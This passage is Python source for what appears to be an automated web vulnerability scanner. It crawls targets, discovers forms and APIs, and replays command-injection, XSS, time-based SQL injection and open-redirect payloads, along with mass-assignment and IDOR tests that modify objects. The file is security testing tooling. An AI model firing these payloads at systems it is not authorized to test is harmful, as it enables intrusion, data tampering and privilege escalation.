"""Blind engagement runner: the real-world flow, with no hand-fed endpoints.

  crawl (blind, authenticated, logout-safe)
    -> discover forms + CSRF tokens
    -> build injection targets (url, method, params, csrf)
    -> run tools form-aware and CSRF-aware (each param tested)
    -> verify findings by deterministic replay (kill FPs)
    -> score

This is what runs against a real target: it does not know where the vulnerabilities are.
CSRF handling gets past per-request tokens on hardened forms; form-awareness tests POST
params; verification confirms each hit so a payload-set gap in one tool is caught by another
and false positives never reach the report.
"""

from __future__ import annotations

import json
import os
import re
import subprocess
import sys
import threading
import time
from collections import Counter as _Counter
import tempfile
from dataclasses import dataclass, field
from urllib.parse import quote, urljoin, urlsplit


def _bootstrap_tool_path() -> None:
    """Put the dast-ng tool locations on PATH so every adapter's shutil.which(binary) resolves,
    however the engagement was launched: ~/.dastng/bin (wrapper scripts + symlinks for git/venv
    tools), ~/go/bin (Go tools like crlfuzz), and the active venv's bin (pip console scripts).
    Override the tool-bin dir with DASTNG_TOOLS_BIN."""
    extra = [os.environ.get("DASTNG_TOOLS_BIN", os.path.expanduser("~/.dastng/bin")),
             os.path.expanduser("~/go/bin"), os.path.dirname(sys.executable),
             "/opt/homebrew/bin", "/usr/local/bin"]   # standard CLI-tool dirs (nuclei/katana/...)
    cur = os.environ.get("PATH", "").split(os.pathsep)
    os.environ["PATH"] = os.pathsep.join([p for p in extra if p and p not in cur] + cur)


_bootstrap_tool_path()

from .orchestrator.forms import fetch_forms


@dataclass
class Target:
    url: str
    method: str = "GET"
    params: list[str] = field(default_factory=list)
    values: dict = field(default_factory=dict)
    csrf_field: str | None = None
    csrf_url: str = ""
    # API-injection shape (set by the OpenAPI seeder): which params live in the URL PATH vs the
    # body, and whether the body is JSON. Lets the probes inject into /users/v1/{id} (BOLA/path
    # SQLi) and into JSON request bodies, not just query/form params.
    body_type: str = "form"            # "form" | "json"
    path_params: list[str] = field(default_factory=list)
    template: str = ""                 # URL with {param} placeholders for path injection

    def data_string(self, mark: str = "1") -> str:
        return "&".join(f"{p}={self.values.get(p) or mark}" for p in self.params)


@dataclass
class Finding:
    tool: str
    category: str
    url: str
    param: str | None = None
    method: str = "GET"
    evidence: str = ""
    verified: bool | None = None       # None=unverified, True=confirmed, False=refuted
    verify_note: str = ""
    # Full proof: the labeled HTTP request/response exchange(s) that triggered the finding (with
    # timing + size), so a report shows the actual attack + the server's telling response.
    evidence_log: list = field(default_factory=list)
    payload: str = ""              # the exact payload that triggered it
    detection: str = ""            # detection method (error-based / time-based / reflection / oast…)
    confidence: str = ""           # confirmed | firm | tentative
    raw_output: str = ""           # subprocess tool's raw output (sqlmap/nuclei/dalfox/jwt_tool…)
    repro: str = ""                # a curl command that reproduces the finding


def _run(args: list[str], timeout: int, stdin: str | None = None) -> str:
    try:
        p = subprocess.run(args, input=stdin, capture_output=True, text=True,
                           timeout=timeout, check=False)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as exc:  # noqa: BLE001
        return f"__EXEC_ERROR__ {exc}"


# ----- discovery --------------------------------------------------------------

def blind_crawl(target: str, cookie: str, depth: int = 3, duration: str = "3m",
                politeness=None, headless: bool | None = None,
                seeds: list[str] | None = None) -> list[str]:
    """katana blind crawl (logout-safe, host-scoped, plain-URL output).

    Headless SPA mode: -hl drives a real browser, -aff auto-fills/submits forms, -xhr captures
    the XHR/fetch API calls an SPA makes at runtime. This is how the crawl reaches the
    /rest + /api surface of an Angular/React app. But it is slow and adds nothing on a
    server-rendered app (JSP/PHP/ASP) whose links are already in the raw HTML.

    The `headless` decision comes from the fingerprint stage (SPA => True, MPA => False).
    Precedence: explicit DASTNG_HEADLESS_CRAWL env (operator override) > `headless` arg
    (fingerprint) > legacy default (on). Pass `seeds` to crawl several entry roots (used when
    the landing page is link-poor and the fingerprint discovered richer entry points)."""
    env = os.environ.get("DASTNG_HEADLESS_CRAWL")
    if env is not None:
        use_headless = env != "0"                # operator override wins
    elif headless is not None:
        use_headless = headless                  # fingerprint decision
    else:
        use_headless = True                      # legacy default

    roots = list(dict.fromkeys([target, *(seeds or [])]))
    urls: set[str] = set()
    for root in roots:
        args = ["katana", "-u", root, "-jc", "-silent", "-d", str(depth), "-ct", duration,
                "-cos", "logout|signout|/setup|reset", "-fs", "fqdn", "-kf", "all"]
        if use_headless:
            args += ["-hl", "-aff", "-xhr"]      # headless browser + auto-form-fill + XHR
        args += politeness.katana_flags() if politeness else ["-c", "10"]
        if cookie:
            args += ["-H", f"Cookie: {cookie}"]
        out = _run(args, timeout=1800)           # generous budget (headless is slow)
        urls |= {ln.strip() for ln in out.splitlines() if ln.strip().startswith("http")}
    return sorted(urls)


_OPENAPI_PATHS = (
    "openapi.json", "swagger.json", "api-docs", "v2/api-docs", "v3/api-docs",
    "swagger/v1/swagger.json", "api/swagger.json", "api/openapi.json", "api/v1/openapi.json",
    "openapi.yaml", "swagger.yaml", "api-docs/swagger.json", "docs/openapi.json",
    "swagger-ui/swagger.json", "api/swagger/index.html", "openapi", "swagger",
)
_GRAPHQL_PATHS = ("graphql", "api/graphql", "v1/graphql", "graphql/v1", "query", "gql",
                  "api/gql", "graphql/console", "index.php?graphql")
_JWT_RE = re.compile(r'eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}')


def discover_api_surface(target: str, urls: list[str], cookie: str) -> dict:
    """Find the API surface the API adapters need but nothing else populates: an OpenAPI/Swagger
    schema (schemathesis), a GraphQL endpoint (graphw00f), and a JWT (jwt_tool). Without this the
    API roster ALWAYS no-ops 'not applicable', however API-heavy the app is — the reason those
    tools never fired on any benchmark. Cheap read-only probing of conventional paths + the
    crawled frontier; returns only what actually responds like an API. Runs on every app (a
    hybrid MPA+API still gets API testing), keyed off real surface, not just the fingerprint."""
    import httpx
    root = f"{urlsplit(target).scheme}://{urlsplit(target).netloc}/"
    hdr = {"Cookie": cookie} if cookie else {}
    surface: dict = {}

    # (1) OpenAPI/Swagger schema: conventional paths + any spec-looking crawled URL.
    cand = [urljoin(root, p) for p in _OPENAPI_PATHS]
    cand += [u for u in urls if re.search(r'(openapi|swagger|api-docs)', u, re.I)]
    seen = set()
    for u in cand:
        if u in seen:
            continue
        seen.add(u)
        try:
            r = httpx.get(u, headers=hdr, timeout=8, follow_redirects=True)
        except Exception:  # noqa: BLE001,S112
            continue
        head = r.text[:4000] if r.status_code == 200 else ""
        if r.status_code == 200 and ('"openapi"' in head or '"swagger"' in head
                                     or ('"paths"' in head and '{' in head)):
            surface["openapi_schema"] = str(r.url)
            break

    # (2) GraphQL endpoint: a minimal query that only a GraphQL server answers coherently.
    for p in _GRAPHQL_PATHS:
        u = urljoin(root, p)
        try:
            r = httpx.post(u, headers={**hdr, "Content-Type": "application/json"},
                           json={"query": "{__typename}"}, timeout=8)
        except Exception:  # noqa: BLE001,S112
            continue
        low = r.text.lower()
        if r.status_code < 500 and ("__typename" in r.text or '"data"' in low
                                    or "graphql" in low or '"errors"' in low):
            surface["graphql_endpoint"] = u
            break

    # (3) JWT: from the session cookie we hold, an operator-supplied env token, or a crawled URL.
    jwt = None
    for hay in (cookie or "", " ".join(urls[:200])):
        m = _JWT_RE.search(hay)
        if m:
            jwt = m.group(0)
            break
    jwt = jwt or os.environ.get("DASTNG_JWT")
    if jwt:
        surface["jwt"] = jwt
    return surface


def seed_targets_from_openapi(schema_url: str, cookie: str) -> tuple[list[Target], list[str]]:
    """Turn an OpenAPI/Swagger spec into injection targets + frontier URLs. An API has no HTML
    links, so the crawler reaches ~1 URL and the injection probes get NOTHING to test — the spec
    IS the sitemap. Extract every path+method with its query/body params so the native probes
    (SQLi/XSS/cmdi) fuzz real endpoints, and add every concrete endpoint URL so nuclei-dast /
    schemathesis / passive cover the full documented surface. Returns (targets, urls)."""
    import httpx
    try:
        r = httpx.get(schema_url, headers=_base_headers(cookie), timeout=12, follow_redirects=True)
        spec = r.json()
    except Exception:  # noqa: BLE001
        return [], []
    if not isinstance(spec, dict):
        return [], []
    root = f"{urlsplit(schema_url).scheme}://{urlsplit(schema_url).netloc}"
    base = root
    servers = spec.get("servers")
    if isinstance(servers, list) and servers and isinstance(servers[0], dict):
        su = servers[0].get("url", "")
        base = su if su.startswith("http") else (root + "/" + su.lstrip("/")).rstrip("/")
    elif spec.get("basePath"):   # swagger 2.0
        base = root + "/" + str(spec["basePath"]).lstrip("/")
    base = base.rstrip("/")

    targets: list[Target] = []
    urls: list[str] = []
    for path, ops in (spec.get("paths") or {}).items():
        if not isinstance(ops, dict):
            continue
        raw = str(path)
        template = base + "/" + raw.lstrip("/")                   # keeps {param} placeholders
        full = base + "/" + re.sub(r'\{[^}]+\}', '1', raw).lstrip("/")   # path params -> test value
        urls.append(full)
        for method, op in ops.items():
            if method.lower() not in ("get", "post", "put", "patch", "delete") \
                    or not isinstance(op, dict):
                continue
            qparams, pparams, bparams, is_json = [], [], [], False
            for p in op.get("parameters", []) or []:
                if not isinstance(p, dict) or not p.get("name"):
                    continue
                loc = p.get("in")
                if loc == "query":
                    qparams.append(p["name"])
                elif loc == "path":
                    pparams.append(p["name"])
                elif loc in ("body", "formData"):     # swagger 2.0
                    bparams.append(p["name"])
            content = (op.get("requestBody", {}) or {}).get("content", {})
            for ct in ("application/json", "application/x-www-form-urlencoded", "*/*"):
                props = (content.get(ct, {}) or {}).get("schema", {}).get("properties")
                if isinstance(props, dict):
                    bparams += list(props.keys())
                    is_json = ct == "application/json"
                    break
            M = method.upper()
            allp = sorted(set(qparams + pparams + bparams))
            if not allp:
                continue
            targets.append(Target(
                url=full, method="GET" if M == "GET" else "POST", params=allp,
                path_params=sorted(set(pparams)),
                body_type="json" if is_json else "form",
                template=template))
    return targets, sorted(set(urls))


# Privileged fields an app must never let a client set on itself (mass assignment / BOLA-write =
# privilege escalation). Injected into request bodies; if they take effect, that is the finding.
_MASS_ASSIGN_FIELDS = {
    "admin": True, "is_admin": True, "isAdmin": True, "role": "admin", "roles": ["admin"],
    "is_staff": True, "staff": True, "superuser": True, "is_superuser": True,
    "verified": True, "email_verified": True, "is_active": True, "approved": True,
    "account_balance": 999999, "credit": 999999,
}


def _json_body_props(op: dict) -> list[str]:
    """Documented JSON request-body property names for an OpenAPI operation (v3 + swagger 2.0)."""
    props: list[str] = []
    content = (op.get("requestBody", {}) or {}).get("content", {})
    for ct in ("application/json", "*/*"):
        sch = (content.get(ct, {}) or {}).get("schema", {})
        if isinstance(sch.get("properties"), dict):
            props += list(sch["properties"].keys())
            break
    for p in op.get("parameters", []) or []:      # swagger 2.0 body/formData
        if isinstance(p, dict) and p.get("in") in ("body", "formData") and p.get("name"):
            props.append(p["name"])
    return props


def _sample_value(name: str, tag: str = "dastng") -> str:
    n = name.lower()
    if "email" in n:
        return f"{tag}@example.com"
    if "pass" in n:
        return "Passw0rd!23"
    if "user" in n or "name" in n or "login" in n:
        return tag
    if "id" in n or "count" in n or "qty" in n or "num" in n:
        return "1"
    return tag


def run_api_authz_tests(schema_url: str, cookie: str, fuzz_forms: bool) -> list[Finding]:
    """Broken-authorization tests on an API: MASS ASSIGNMENT (client sets a privileged field the
    server should ignore) and BOLA/IDOR (one identity reads/writes another object). These are the
    OWASP API Top-10 leaders and the top healthcare-API risk (one patient reaching another's
    record). They CREATE and MODIFY objects, so they run ONLY under fuzz_forms (owned/authorized
    targets), never production-safe. Uses the current auth header (set_auth_header) as the acting
    identity. Best-effort + isolated: any failure yields fewer findings, never a crash."""
    import httpx
    out: list[Finding] = []
    if not fuzz_forms:
        return out
    try:
        spec = httpx.get(schema_url, headers=_base_headers(cookie), timeout=12,
                         follow_redirects=True).json()
    except Exception:  # noqa: BLE001
        return out
    if not isinstance(spec, dict):
        return out
    paths = spec.get("paths") or {}
    # resolve base (servers / basePath / schema root), same as the OpenAPI seeder.
    root = f"{urlsplit(schema_url).scheme}://{urlsplit(schema_url).netloc}"
    base = root
    servers = spec.get("servers")
    if isinstance(servers, list) and servers and isinstance(servers[0], dict):
        su = servers[0].get("url", "")
        base = su if su.startswith("http") else (root + "/" + su.lstrip("/")).rstrip("/")
    elif spec.get("basePath"):
        base = root + "/" + str(spec["basePath"]).lstrip("/")
    base = base.rstrip("/")

    def _url(path: str) -> str:
        return base + "/" + re.sub(r'\{[^}]+\}', '1', str(path)).lstrip("/")

    # ---- (1) MASS ASSIGNMENT: inject privileged fields into every JSON-body write ----
    for path, ops in paths.items():
        if not isinstance(ops, dict):
            continue
        for method, op in ops.items():
            if method.lower() not in ("post", "put", "patch") or not isinstance(op, dict):
                continue
            props = _json_body_props(op)
            if not props:
                continue
            url = _url(path)
            body = {p: _sample_value(p) for p in props}
            body.update(_MASS_ASSIGN_FIELDS)          # the privileged extras
            try:
                r = httpx.request(method.upper(), url, json=body, headers=_base_headers(cookie),
                                  timeout=12, follow_redirects=True)
            except Exception:  # noqa: BLE001,S112
                continue
            if r.status_code >= 300:
                continue
            low = r.text.lower()
            # confirmed if the server ECHOES a privileged field we set with our value
            reflected = [k for k in _MASS_ASSIGN_FIELDS
                         if f'"{k}"' in low and ("true" in low or "admin" in low)]
            if reflected:
                out.append(Finding(
                    tool="verify", category="mass-assignment", url=url, param=reflected[0],
                    method=method.upper(),
                    evidence=(f"privileged field {reflected[0]!r} accepted + reflected on "
                              f"{method.upper()} {urlsplit(url).path} (mass assignment / privilege "
                              f"escalation)"), verified=True))

    # ---- (1b) MASS ASSIGNMENT via READ-BACK: create-user endpoints rarely echo the object, so
    # register a user WITH admin:true, then read it back (via any GET endpoint, incl. a collection
    # / debug listing) and confirm the flag actually stuck on OUR object. ----
    def _priv_stuck(data, uname: str) -> bool:
        """Recursively find an object with our username where a privileged field is truthy."""
        if isinstance(data, dict):
            uname_here = any(str(data.get(k, "")).lower() == uname.lower()
                             for k in ("username", "user", "name", "login"))
            priv_here = any(str(data.get(k, "")).lower() in ("true", "1", "admin")
                            for k in ("admin", "is_admin", "isadmin", "role", "is_staff",
                                      "superuser", "is_superuser"))
            if uname_here and priv_here:
                return True
            return any(_priv_stuck(v, uname) for v in data.values())
        if isinstance(data, list):
            return any(_priv_stuck(v, uname) for v in data)
        return False

    _get_eps = [str(p) for p, ops in paths.items()
                if isinstance(ops, dict) and "get" in {m.lower() for m in ops}]
    # A create endpoint's object often only exposes privileged fields via a debug/admin listing
    # that is NOT in the spec (e.g. VAmPI's /users/v1/_debug). Probe a few conventional ones so
    # the read-back can still confirm; relative to each documented collection path too.
    _colls = {re.sub(r'/\{[^}]+\}.*$', '', str(p)).rstrip('/') for p in paths}
    for c in list(_colls) + [""]:
        for dbg in ("_debug", "debug", "all", "list"):
            _get_eps.append((c + "/" + dbg).lstrip("/"))
    for path, ops in paths.items():
        if not isinstance(ops, dict):
            continue
        op = ops.get("post")
        if not isinstance(op, dict):
            continue
        props = _json_body_props(op)
        pl = " ".join(props).lower()
        # a user-CREATION endpoint (register/signup/users), not login — login also has user+pass
        # but creates nothing, so registering there just adds noise.
        if not (("user" in pl or "name" in pl) and "pass" in pl):
            continue
        if any(w in str(path).lower() for w in ("login", "signin", "sign-in", "authenticate", "token")):
            continue
        uname = f"dastngma{int(time.time()) % 100000}{len(out)}"
        body = {p: (uname if ("user" in p.lower() or "name" in p.lower()) else _sample_value(p, uname))
                for p in props}
        body.update({"admin": True, "is_admin": True, "role": "admin"})
        try:
            httpx.request("POST", _url(path), json=body, headers=_base_headers(cookie), timeout=12)
        except Exception:  # noqa: BLE001,S112
            continue
        confirmed_at = None
        for gp in _get_eps:                           # read back via {id} or collection/debug GETs
            gurl = base + "/" + re.sub(r'\{[^}]+\}', uname, gp).lstrip("/")
            try:
                rr = httpx.get(gurl, headers=_base_headers(cookie), timeout=12, follow_redirects=True)
                data = rr.json()
            except Exception:  # noqa: BLE001,S112
                continue
            if rr.status_code < 300 and _priv_stuck(data, uname):
                confirmed_at = urlsplit(gurl).path
                break
        if confirmed_at:
            out.append(Finding(
                tool="verify", category="mass-assignment", url=_url(path), param="admin",
                method="POST",
                evidence=(f"registered a user with admin=true and it PERSISTED (read back as "
                          f"privileged at {confirmed_at}) — privilege escalation via mass "
                          f"assignment"), verified=True))

    # ---- (2) BOLA / IDOR: enumerate objects via a collection endpoint, then modify ANOTHER
    # object with the current identity. A 2xx write on an object we do not own = broken
    # object-level authorization (the top healthcare-API risk: cross-record access). ----
    others: list[str] = []
    for path, ops in paths.items():
        if "{" in str(path) or not isinstance(ops, dict) or "get" not in {m.lower() for m in ops}:
            continue
        try:
            r = httpx.get(_url(path), headers=_base_headers(cookie), timeout=12, follow_redirects=True)
            data = r.json()
        except Exception:  # noqa: BLE001,S112
            continue
        for m in re.finditer(r'"(?:username|user|name|login|id|email)"\s*:\s*"([^"]{1,64})"',
                             json.dumps(data) if not isinstance(data, str) else data):
            others.append(m.group(1))
    others = [o for o in dict.fromkeys(others) if "dastng" not in o.lower()][:4]
    _bola_done = set()
    for path, ops in paths.items():
        if "{" not in str(path) or not isinstance(ops, dict):
            continue
        for method, op in ops.items():
            if method.lower() not in ("put", "patch") or urlsplit(_url(path)).path in _bola_done:
                continue
            props = _json_body_props(op)
            body = {p: _sample_value(p) for p in props} if props else None
            for oid in others:
                target_url = base + "/" + re.sub(r'\{[^}]+\}', str(oid), str(path)).lstrip("/")
                try:
                    r = httpx.request(method.upper(), target_url, json=body,
                                      headers=_base_headers(cookie), timeout=12,
                                      follow_redirects=True)
                except Exception:  # noqa: BLE001,S112
                    continue
                if r.status_code < 300:
                    _bola_done.add(urlsplit(_url(path)).path)
                    _ev = [{
                        "request": {"method": method.upper(), "url": target_url,
                                    "headers": _redact_headers(_base_headers(cookie)),
                                    "body": json.dumps(body) if body else ""},
                        "response": {"status": r.status_code,
                                     "headers": _redact_headers(dict(r.headers)),
                                     "body": (r.text or "")[:_EVID_MAX_BODY]},
                    }]
                    out.append(Finding(
                        tool="verify", category="bola", url=target_url, param=None,
                        method=method.upper(),
                        evidence=(f"{method.upper()} on another object ({oid!r}) at "
                                  f"{urlsplit(target_url).path} returned {r.status_code} with the "
                                  f"current identity — broken object-level authorization (IDOR)"),
                        verified=True, evidence_log=_ev))
                    break
    return out


def discover_targets(urls: list[str], cookie: str, host: str) -> list[Target]:
    """Turn crawled URLs into injection targets: GET URLs with query params, and every
    discovered form (POST/GET) with its CSRF token."""
    targets: list[Target] = []
    seen: set = set()
    # host may carry a port (localhost:3000) while urlsplit(...).hostname strips it — compare
    # hostname to hostname or every param URL on a non-80/443 target is silently skipped.
    want_host = (host or "").rsplit("@", 1)[-1].split(":")[0].lower()

    for u in urls:
        parts = urlsplit(u)
        if parts.query and (parts.hostname or want_host).lower() == want_host:
            params = sorted({kv.split("=")[0] for kv in parts.query.split("&") if kv})
            key = (parts.path, "GET", tuple(params))
            if key not in seen:
                seen.add(key)
                targets.append(Target(url=u, method="GET", params=params))

    # forms (fetch each unique page once)
    for page in sorted({u.split("?")[0] for u in urls}):
        if (urlsplit(page).hostname or want_host).lower() != want_host:
            continue
        for f in fetch_forms(page, cookie):
            ip = f.injectable_params()
            if not ip:
                continue
            key = (urlsplit(f.action).path, f.method, tuple(sorted(ip)))
            if key in seen:
                continue
            seen.add(key)
            targets.append(Target(url=f.action, method=f.method, params=ip, values=f.values,
                                  csrf_field=f.csrf_field, csrf_url=f.csrf_url))
    return targets


# ----- response pipeline (Burp-style passive inspection of EVERY response) ----
# Any response the probes generate (including AUDIT-time responses to injected payloads) is
# fed to the active PII sink, so PII that only surfaces in an error/audit response is caught
# (that's how Burp found the WAVSEP email — not on the crawled page, but in an audit response).
_PII_SINK = None


def set_pii_sink(collector) -> None:
    global _PII_SINK
    _PII_SINK = collector


def _feed(url: str, body: str) -> None:
    sink = _PII_SINK
    if sink is not None and body:
        try:
            sink.feed(url, body)
        except Exception:  # noqa: BLE001,S110 - inspection must never break a probe
            pass


# ----- verification (deterministic replay) ------------------------------------

def verify_cmdi(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    """Replay a command-injection marker across common separators (incl. the bare-pipe
    bypass that DVWA-high allows). Confirms by the `id` command output signature."""
    import httpx
    seps = [";id", "|id", "| id", "&&id", "%0aid", "`id`", "$(id)"]
    headers = _base_headers(cookie)
    for sep in seps:
        payload = f"127.0.0.1{sep}"
        try:
            if method == "POST":
                r = httpx.post(url, data={param: payload, "Submit": "Submit"},
                               headers=headers, follow_redirects=True, timeout=12)
            else:
                r = httpx.get(url, params={param: payload}, headers=headers,
                              follow_redirects=True, timeout=12)
        except Exception:  # noqa: BLE001, S112
            continue
        _feed(url, r.text)   # passive PII inspection of the audit-time response (Burp-style)
        _rec(method, url, headers, f"{param}={payload}", r)
        if "uid=" in r.text and "gid=" in r.text:
            return True, f"cmd exec confirmed via '{sep}' (uid= in response)"
    return False, "no command output on replay"


def verify_reflected_xss(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    """Reflected XSS across injection CONTEXTS. A single angle-bracket payload only proves
    HTML-body injection and misses the common cases where the value lands inside an attribute or
    an event handler — there the value can be HTML-encoded yet still exploitable by breaking out
    of the surrounding quote. Try a small context-diverse set and confirm only when a payload
    reflects VERBATIM (unencoded), which is what actually makes it execute. Returns on first hit."""
    import httpx
    m = "dxsc9k1z"
    # (payload, human tag). Ordered cheap->broad; each proves execution only if it appears
    # verbatim (the breakout char + handler survived un-encoded).
    # Go DEEP: cover every injection context. Each payload's `conf` is the confidence a VERBATIM
    # reflection earns. Angle-bracket payloads (<svg>/<img>) that reflect verbatim always open a
    # real tag => CONFIRMED executable. Attribute/event-handler breakouts (bare " onmouseover=)
    # reflecting verbatim are exploitable IN an attribute context but can also echo as harmless
    # body text => SUSPECTED (flagged for the analyst, headless-confirm recommended). We surface
    # both rather than dropping the deep payloads — thoroughness over silence.
    payloads = (
        (f"<sVg/onload=alert({m})>", "html-tag", "confirmed"),
        (f"<img src=x onerror=alert({m})>", "script-strip-bypass", "confirmed"),
        (f'"><sVg/onload=alert({m})>', "dq-attr-breakout", "confirmed"),
        (f"'><sVg/onload=alert({m})>", "sq-attr-breakout", "confirmed"),
        (f'" onmouseover="alert({m})//', "dq-event-handler", "suspected"),
        (f"' onmouseover='alert({m})//", "sq-event-handler", "suspected"),
        (f"javascript:alert({m})//", "js-uri", "suspected"),     # href/src sink context
    )
    headers = _base_headers(cookie)
    encoded = False
    suspected = None
    for pay, tag, conf in payloads:
        try:
            if method == "POST":
                r = httpx.post(url, data={param: pay}, headers=headers,
                               follow_redirects=True, timeout=12)
            else:
                r = httpx.get(url, params={param: pay}, headers=headers,
                              follow_redirects=True, timeout=12)
        except Exception:  # noqa: BLE001 - try the next payload
            continue
        _feed(url, r.text)   # passive PII inspection of the audit-time response (Burp-style)
        _rec(method, url, headers, f"{param}={pay}", r)
        if pay in r.text:                       # reflected VERBATIM => breakout survived
            if conf == "confirmed":
                return True, f"reflected unencoded ({tag}) — confirmed executable"
            # remember the first suspected hit but keep trying for a confirmed one
            suspected = suspected or f"reflected unencoded ({tag}) — SUSPECTED (context-dependent)"
        elif m in r.text:
            encoded = True
    if suspected:
        return True, suspected
    return (False, "reflected but encoded/neutralised") if encoded else (False, "not reflected")


# DOM-XSS source->sink flow: a client-side DOM XSS (DVWA xss_d, and most SPA XSS) never reflects
# server-side — the param is read from the URL BY JAVASCRIPT (document.location/hash/name) and
# written to a dangerous sink (document.write/innerHTML/eval) in the browser, so no server response
# ever contains the payload. A native scanner can still flag it from the STATIC source->sink flow
# in the page's inline JS; execution needs a browser, so it is reported SUSPECTED (headless-confirm
# recommended) rather than confirmed. This is the additive native complement to headless dalfox.
_DOM_SOURCES = re.compile(
    r'\b(document\.(?:location|URL|documentURI|referrer|cookie|baseURI)'
    r'|location\.(?:href|search|hash|pathname)|window\.name|history\.(?:pushState|replaceState)'
    r'|decodeURI(?:Component)?\s*\(\s*(?:document\.|location|window\.name))', re.I)
_DOM_SINKS = re.compile(
    r'\b(document\.write(?:ln)?\s*\(|\.innerHTML\s*=|\.outerHTML\s*=|\.insertAdjacentHTML\s*\('
    r'|eval\s*\(|setTimeout\s*\(\s*[\'"]?[a-z_$]|setInterval\s*\(\s*[\'"]|\.setAttribute\s*\(\s*'
    r'[\'"]?(?:src|href)|\$\s*\(\s*(?:document\.|location)|jquery\.globalEval)', re.I)
_SCRIPT_BLOCK = re.compile(r'<script\b[^>]*>(.*?)</script>', re.I | re.S)


def verify_dom_xss(url: str, cookie: str) -> tuple[bool, str]:
    """Page-level DOM-XSS heuristic: the page's inline JS reads a URL-controlled SOURCE
    (location/hash/name/referrer) AND passes data to a dangerous SINK (document.write/innerHTML/
    eval). Reported SUSPECTED — a browser is needed to confirm execution — but this is exactly the
    class that reflects nowhere server-side (DVWA xss_d, SPA router XSS) and would otherwise be a
    silent miss. High-signal: requires BOTH a source and a sink in the same page."""
    import httpx
    headers = _base_headers(cookie)
    try:
        r = httpx.get(url, headers=headers, follow_redirects=True, timeout=12)
    except Exception as exc:  # noqa: BLE001
        return False, f"fetch error: {exc}"
    _rec("GET", url, headers, None, r)
    js = "\n".join(_SCRIPT_BLOCK.findall(r.text or ""))
    if not js:
        return False, "no inline script"
    src = _DOM_SOURCES.search(js)
    snk = _DOM_SINKS.search(js)
    if src and snk:
        return True, (f"DOM-XSS source->sink flow — SUSPECTED (headless-confirm): "
                      f"source {src.group(1)[:32]!r} -> sink {snk.group(1)[:24]!r}")
    return False, "no DOM source->sink flow"


# SQL-error signatures (MySQL/generic) — strong, low-FP.
_SQL_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
    "supplied argument is not a valid mysql", "sqlstate[", "unclosed quotation mark",
    "quoted string not properly terminated", "sql syntax.*mysql", "mysqli_",
    "pg_query", "psql:", "sqlite3::", "odbc sql", "microsoft ole db",
]

# ---- adaptive time-based blind SQLi: dialect x injection-context matrix -------------------
# The single biggest WAVSEP SQLi gap was DIALECT+CONTEXT coverage: two MySQL payloads in one
# string context can't delay a Postgres/MSSQL/Oracle backend, or a MySQL one reached through a
# numeric / double-quote / parenthesis context. We detect the DB DIALECT from the error signature
# (the adaptive signal) and try that dialect FIRST, then fall through to the others so an app that
# gives no error is still covered exhaustively (additive, never fewer payloads). Each entry is a
# {n}-parameterised delay payload proven for that backend; contexts vary the break-out.
_SQL_DIALECT_SIG = {   # error-text substring -> dialect key
    "mysql": "mysql", "mariadb": "mysql", "you have an error in your sql syntax": "mysql",
    "postgresql": "postgres", "pg_query": "postgres", "pg_": "postgres",
    "syntax error at or near": "postgres",
    "microsoft sql server": "mssql", "odbc sql server": "mssql", "sql server": "mssql",
    "unclosed quotation mark": "mssql", "microsoft ole db": "mssql",
    "ora-": "oracle", "oracle": "oracle", "quoted string not properly terminated": "oracle",
    "sqlite": "sqlite", "sqlite3::": "sqlite",
}
# dialect -> list of (label, payload template with {n} seconds). Multiple injection contexts
# (string ', numeric, double ", paren) per dialect so the break-out is not assumed.
_TIME_PAYLOADS = {
    "mysql": [
        ("str-and", "1' AND SLEEP({n})-- -"), ("str-or", "1' OR SLEEP({n})-- -"),
        ("num-and", "1 AND SLEEP({n})"), ("num-or", "1 OR SLEEP({n})"),
        ("dq-and", '1" AND SLEEP({n})-- -'), ("paren-str", "1') AND SLEEP({n})-- -"),
        ("subq", "1' AND (SELECT SLEEP({n}))-- -"),
    ],
    "postgres": [
        ("str", "1' AND (SELECT 1 FROM PG_SLEEP({n}))-- -"),
        ("num", "1 AND (SELECT 1 FROM PG_SLEEP({n}))"),
        ("stack", "1'; SELECT PG_SLEEP({n})-- -"),
        ("paren", "1') AND (SELECT 1 FROM PG_SLEEP({n}))-- -"),
    ],
    "mssql": [
        ("str", "1'; WAITFOR DELAY '0:0:{n}'-- -"), ("num", "1; WAITFOR DELAY '0:0:{n}'-- -"),
        ("bare", "1' WAITFOR DELAY '0:0:{n}'-- -"), ("paren", "1'); WAITFOR DELAY '0:0:{n}'-- -"),
    ],
    "oracle": [
        ("str", "1' AND {n}=DBMS_PIPE.RECEIVE_MESSAGE('a',{n})-- -"),
        ("num", "1 AND {n}=DBMS_PIPE.RECEIVE_MESSAGE('a',{n})"),
    ],
    # (SQLite has no time function; its heavy-op timing is unreliable + memory-risky, so it is
    # covered by the error-based signature only, not the differential time-based pass.)
}
_TIME_DIALECT_ORDER = ("mysql", "postgres", "mssql", "oracle")


def _detect_sql_dialect(err_text: str) -> str | None:
    low = (err_text or "").lower()
    for sig, dia in _SQL_DIALECT_SIG.items():
        if sig in low:
            return dia
    return None
_REDIRECT_PARAMS = {"redirect", "redirect_uri", "redirect_url", "redirecturl", "url", "uri",
                    "next", "return", "returnurl", "return_url", "returnto", "return_to",
                    "dest", "destination", "continue", "goto", "go", "out", "target", "to",
                    "link", "forward", "callback", "checkout_url", "r", "u", "rurl", "redir",
                    "view", "image_url", "domain", "window", "path", "page"}
# Attacker marker host + real allowlist-BYPASS payload forms (the OpenRedireX / Burp technique,
# generalized). Every payload aims Location at the marker host through a different parser-confusion
# trick, so a flawed allowlist (startswith / contains / naive-parse) still lands off-site. Confirmed
# via the Location header WITHOUT following (no egress needed, unlike a follow-the-redirect tool).
_OR_HOST = "evil.example"
_OR_PAYLOADS = (
    f"https://{_OR_HOST}/x",            # naive
    f"http://{_OR_HOST}/x",
    f"//{_OR_HOST}/x",                  # protocol-relative
    f"///{_OR_HOST}/x",
    f"////{_OR_HOST}/x",
    f"https:{_OR_HOST}/x",             # missing slashes
    f"https:/{_OR_HOST}/x",
    rf"/\{_OR_HOST}/x",                 # backslash confusion
    rf"\/\/{_OR_HOST}/x",
    f"https://trusted.com@{_OR_HOST}/x",   # userinfo bypass (allowlist 'startswith trusted')
    f"https://{_OR_HOST}/?x=trusted.com",  # contains-check bypass
    f"https://{_OR_HOST}#trusted.com",
